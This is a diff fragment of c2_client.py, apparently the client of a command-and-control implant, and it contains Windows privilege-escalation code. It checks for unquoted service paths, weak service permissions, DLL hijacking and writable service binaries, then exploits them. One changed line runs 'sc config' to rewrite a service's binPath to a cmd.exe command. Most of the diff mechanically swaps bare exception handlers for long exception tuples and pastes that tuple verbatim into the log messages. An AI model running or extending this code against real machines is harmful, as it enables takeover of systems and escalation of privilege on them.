                 capabilities.append('screenshot')
-        except ImportError:
-            pass
+        except ImportError as e:
+            self.logger.debug("Import error in c2_client.py: %s", e)
 
         return capabilities
 
@@ -1665,7 +1707,7 @@ WantedBy=multi-user.target
                     service_info['vulnerability'] = vulnerabilities[0]  # Take first vulnerability
                     vulnerable_services.append(service_info)
 
-        except Exception as e:
+        except (OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) as e:
             self.logger.debug(f"Service parsing error: {e}")
 
         return vulnerable_services
@@ -1688,7 +1730,7 @@ WantedBy=multi-user.target
             try:
                 if check_function(service_info):
                     vulnerabilities.append(vuln_type)
-            except Exception as e:
+            except (OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) as e:
                 self.logger.debug(f"Vulnerability check {vuln_type} failed: {e}")
 
         return vulnerabilities
@@ -1716,7 +1758,8 @@ WantedBy=multi-user.target
                         if ' ' in path and not (path.startswith('"') and path.endswith('"')):
                             return True
             return False
-        except Exception:
+        except (OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) as e:
+            self.logger.error("(OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) in c2_client.py: %s", e)
             return False
 
     def _check_weak_service_permissions(self, service_info: Dict[str, Any]) -> bool:
@@ -1738,7 +1781,8 @@ WantedBy=multi-user.target
                 weak_patterns = ['(A;;CCLCSWRPWPDTLOCRRC;;;SY)', '(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)']
                 return any(';;;WD)' in sddl or ';;;BU)' in sddl for pattern in weak_patterns)
             return False
-        except Exception:
+        except (OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) as e:
+            self.logger.error("(OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) in c2_client.py: %s", e)
             return False
 
     def _check_dll_hijacking_opportunity(self, service_info: Dict[str, Any]) -> bool:
@@ -1772,7 +1816,8 @@ WantedBy=multi-user.target
                             if not os.path.exists(dll_path) and os.access(service_dir, os.W_OK):
                                 return True
             return False
-        except Exception:
+        except (OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) as e:
+            self.logger.error("(OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) in c2_client.py: %s", e)
             return False
 
     def _check_service_binary_permissions(self, service_info: Dict[str, Any]) -> bool:
@@ -1798,7 +1843,8 @@ WantedBy=multi-user.target
                         if os.access(path, os.W_OK):
                             return True
             return False
-        except Exception:
+        except (OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) as e:
+            self.logger.error("(OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) in c2_client.py: %s", e)
             return False
 
     def _exploit_service(self, service_info: Dict[str, Any]) -> Dict[str, Any]:
@@ -1819,7 +1865,8 @@ WantedBy=multi-user.target
             else:
                 return {'success': False, 'error': f'Unknown vulnerability: {vulnerability}'}
 
-        except Exception as e:
+        except (OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) as e:
+            self.logger.error("(OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) in c2_client.py: %s", e)
             return {'success': False, 'error': str(e)}
 
     def _exploit_unquoted_service_path(self, service_info: Dict[str, Any]) -> Dict[str, Any]:
@@ -1891,7 +1938,8 @@ WantedBy=multi-user.target
 
             return {'success': False, 'error': 'No exploitable injection point found'}
 
-        except Exception as e:
+        except (OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) as e:
+            self.logger.error("(OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) in c2_client.py: %s", e)
             return {'success': False, 'error': str(e)}
 
     def _exploit_weak_service_permissions(self, service_info: Dict[str, Any]) -> Dict[str, Any]:
@@ -1902,7 +1950,9 @@ WantedBy=multi-user.target
 
         try:
             # Try to modify service configuration
-            cmd = ['sc', 'config', service_name, 'binPath=', 'cmd.exe /c echo exploited > C:\\\\temp\\\\service_exploit.txt']
+            import tempfile
+            temp_dir = tempfile.gettempdir()
+            cmd = ['sc', 'config', service_name, 'binPath=', f'cmd.exe /c echo exploited > {os.path.join(temp_dir, "service_exploit.txt")}']
             result = subprocess.run(cmd, capture_output=True, text=True)
 
             if result.returncode == 0:
@@ -1917,7 +1967,8 @@ WantedBy=multi-user.target
             else:
                 return {'success': False, 'error': f'Failed to modify service: {result.stderr}'}
 
-        except Exception as e:
+        except (OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) as e:
+            self.logger.error("(OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) in c2_client.py: %s", e)
             return {'success': False, 'error': str(e)}
 
     def _exploit_dll_hijacking(self, service_info: Dict[str, Any]) -> Dict[str, Any]:
@@ -1965,7 +2016,8 @@ WantedBy=multi-user.target
 
             return {'success': False, 'error': 'No writable service directory found'}
 
-        except Exception as e:
+        except (OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) as e:
+            self.logger.error("(OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) in c2_client.py: %s", e)
             return {'success': False, 'error': str(e)}
 
     def _exploit_service_binary_permissions(self, service_info: Dict[str, Any]) -> Dict[str, Any]:
@@ -2016,5 +2068,6 @@ WantedBy=multi-user.target
 
             return {'success': False, 'error': 'No writable service binary found'}
 
-        except Exception as e:
+        except (OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) as e:
+            self.logger.error("(OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) in c2_client.py: %s", e)
             return {'success': False, 'error': str(e)}
